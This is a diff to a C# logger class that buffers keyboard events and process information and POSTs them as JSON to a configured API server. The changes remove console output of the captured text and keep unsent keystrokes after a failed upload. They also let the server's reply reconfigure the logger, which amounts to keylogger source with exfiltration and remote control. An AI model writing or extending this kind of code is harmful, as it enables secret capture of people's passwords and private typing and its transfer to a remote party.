@@ -1,5 +1,6 @@
 ﻿using System.Diagnostics;
 using System.Net;
+using System.Net.Http.Json;
 using System.Text;
 using Microsoft.VisualBasic.CompilerServices;
 
@@ -53,7 +54,7 @@ public class Logger
         if (!_config.LOG_KEYBOARD_EVENTS) return;
         _line += key;
         _eventsLogged++;
-        if (_eventsLogged < _config.COUNT_EVENTS_BEFORE_LOG_ON_FILE) return;
+        if (_eventsLogged < _config.MAX_CONT_EVENTS) return;
         Log();
     }
 
@@ -110,10 +111,6 @@ public class Logger
         }
         ProcessLog(true); // update actual processes
         body = DateTime.Now +" | "+ body + _line;
-        _line = "" ;
-        Console.WriteLine(body);
-        // todo send the log to the server
-        // if any error occurs, Log(" $ "timestamp+body)
         HttpResponseMessage response = null;
         try
         {
@@ -125,23 +122,23 @@ public class Logger
                     Constants.API_URL,
                     new StringContent(rBody,
                         Encoding.UTF8,
-                        "application/json"))
-                    .Result;
+                        "application/json")).Result;
                 if (response.IsSuccessStatusCode)
                 {
-                    Console.WriteLine("Log sent");              
+                    _line = "";
+                    // read request body
+                    var r = response.Content.ReadAsStringAsync().Result;
+                    _config.UpdateConfig(r);
+                    return;
                 }
-                else
-                {
-                    Console.WriteLine("Error sending log");
-                }
+                throw new Exception("Error sending log to server");
             }
         }
         catch (Exception ex)
         {
             Console.WriteLine(ex.Message);
+            _line = body; //keeping log file
         }
-        Console.WriteLine(response);
     }
     
 }
